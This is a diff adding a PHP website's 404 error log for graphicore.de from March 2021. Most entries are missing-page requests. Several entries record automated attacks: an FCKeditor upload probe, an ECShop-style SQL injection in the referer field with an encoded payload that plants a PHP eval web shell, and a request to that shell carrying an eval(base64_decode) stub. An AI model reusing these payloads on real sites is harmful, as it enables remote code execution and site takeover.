@@ -1,0 +1,225 @@
+2021-03-18T03:21:36+00:00 ERR (3) 404 "hire-lasse" was not found.
+REMOTE_ADDR: 95.216.96.243
+HTTP_REFERER: http://graphicore.de/en/feed/rss
+requested: array(5) {
+  ["lang"] => string(2) "en"
+  ["action"] => string(4) "page"
+  ["key"] => string(10) "hire-lasse"
+  ["module"] => string(7) "default"
+  ["controller"] => string(5) "index"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T03:21:45+00:00 ERR (3) 404 "competences" was not found.
+REMOTE_ADDR: 95.216.96.243
+HTTP_REFERER: http://graphicore.de/de/page/lasse
+requested: array(5) {
+  ["lang"] => string(2) "de"
+  ["action"] => string(4) "page"
+  ["key"] => string(11) "competences"
+  ["module"] => string(7) "default"
+  ["controller"] => string(5) "index"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T03:21:47+00:00 ERR (3) 404 "competences" was not found.
+REMOTE_ADDR: 95.216.96.243
+HTTP_REFERER: http://graphicore.de/en/page/lasse
+requested: array(5) {
+  ["lang"] => string(2) "en"
+  ["action"] => string(4) "page"
+  ["key"] => string(11) "competences"
+  ["module"] => string(7) "default"
+  ["controller"] => string(5) "index"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T06:05:08+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 207.244.234.70
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(10) "windex.php"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T09:44:16+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 94.130.64.96
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(11) "sitemap.xml"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T09:44:18+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 94.130.64.96
+HTTP_REFERER: 
+requested: array(3) {
+  ["controller"] => string(11) "sitemap.xml"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T10:17:56+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 116.213.41.92
+HTTP_REFERER: http://graphicore.de/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F
+requested: array(8) {
+  ["controller"] => string(9) "FCKeditor"
+  ["action"] => string(6) "editor"
+  ["filemanager"] => string(10) "connectors"
+  ["asp"] => string(13) "connector.asp"
+  ["module"] => string(7) "default"
+  ["Command"] => string(10) "FileUpload"
+  ["Type"] => string(4) "File"
+  ["CurrentFolder"] => string(1) "/"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T10:17:56+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 116.213.41.92
+HTTP_REFERER: http://graphicore.de/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F
+requested: array(8) {
+  ["controller"] => string(9) "FCKeditor"
+  ["action"] => string(6) "editor"
+  ["filemanager"] => string(10) "connectors"
+  ["asp"] => string(13) "connector.asp"
+  ["module"] => string(7) "default"
+  ["Command"] => string(10) "FileUpload"
+  ["Type"] => string(4) "File"
+  ["CurrentFolder"] => string(1) "/"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T10:17:57+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 116.213.41.92
+HTTP_REFERER: http://graphicore.de/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F
+requested: array(8) {
+  ["controller"] => string(9) "FCKeditor"
+  ["action"] => string(6) "editor"
+  ["filemanager"] => string(10) "connectors"
+  ["asp"] => string(13) "connector.asp"
+  ["module"] => string(7) "default"
+  ["Command"] => string(10) "FileUpload"
+  ["Type"] => string(4) "File"
+  ["CurrentFolder"] => string(1) "/"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T10:17:57+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 116.213.41.92
+HTTP_REFERER: http://graphicore.de/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F
+requested: array(8) {
+  ["controller"] => string(9) "FCKeditor"
+  ["action"] => string(6) "editor"
+  ["filemanager"] => string(10) "connectors"
+  ["asp"] => string(13) "connector.asp"
+  ["module"] => string(7) "default"
+  ["Command"] => string(10) "FileUpload"
+  ["Type"] => string(4) "File"
+  ["CurrentFolder"] => string(1) "/"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T10:17:57+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 116.213.41.92
+HTTP_REFERER: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:288:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -";s:2:"id";s:3:"'/*";}
+requested: array(4) {
+  ["controller"] => string(8) "user.php"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+  ["act"] => string(5) "login"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T10:17:57+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 116.213.41.92
+HTTP_REFERER: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:288:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -";s:2:"id";s:3:"'/*";}
+requested: array(4) {
+  ["controller"] => string(8) "user.php"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+  ["act"] => string(5) "login"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T10:17:58+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 116.213.41.92
+HTTP_REFERER: http://graphicore.de/fdgq.php
+requested: array(5) {
+  ["controller"] => string(8) "fdgq.php"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+  ["lequ"] => string(100) "@session_start();$_SESSION[chr(90)]=$_POST[chr(124)];@eval(base64_decode($_SESSION[chr(90)]));die();"
+  ["|"] => string(20) "ZWNobyAie3JvYm90fSI7"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T10:17:58+00:00 ERR (3) 404 Seite nicht gefunden
+REMOTE_ADDR: 116.213.41.92
+HTTP_REFERER: http://graphicore.de/fdgq.php
+requested: array(5) {
+  ["controller"] => string(8) "fdgq.php"
+  ["action"] => string(5) "index"
+  ["module"] => string(7) "default"
+  ["lequ"] => string(100) "@session_start();$_SESSION[chr(90)]=$_POST[chr(124)];@eval(base64_decode($_SESSION[chr(90)]));die();"
+  ["|"] => string(20) "ZWNobyAie3JvYm90fSI7"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T14:19:20+00:00 ERR (3) 404 "hire-lasse" was not found.
+REMOTE_ADDR: 114.119.149.137
+HTTP_REFERER: 
+requested: array(5) {
+  ["lang"] => string(2) "en"
+  ["action"] => string(4) "page"
+  ["key"] => string(10) "hire-lasse"
+  ["module"] => string(7) "default"
+  ["controller"] => string(5) "index"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T14:33:15+00:00 ERR (3) 404 "competences" was not found.
+REMOTE_ADDR: 94.130.64.96
+HTTP_REFERER: 
+requested: array(5) {
+  ["lang"] => string(2) "de"
+  ["action"] => string(4) "page"
+  ["key"] => string(11) "competences"
+  ["module"] => string(7) "default"
+  ["controller"] => string(5) "index"
+}
+
+
+--------------------------------------------------------------------------------
+2021-03-18T14:33:18+00:00 ERR (3) 404 "hire-lasse" was not found.
+REMOTE_ADDR: 94.130.64.96
+HTTP_REFERER: 
+requested: array(5) {
+  ["lang"] => string(2) "de"
+  ["action"] => string(4) "page"
+  ["key"] => string(10) "hire-lasse"
+  ["module"] => string(7) "default"
+  ["controller"] => string(5) "index"
+}
+
+
+--------------------------------------------------------------------------------
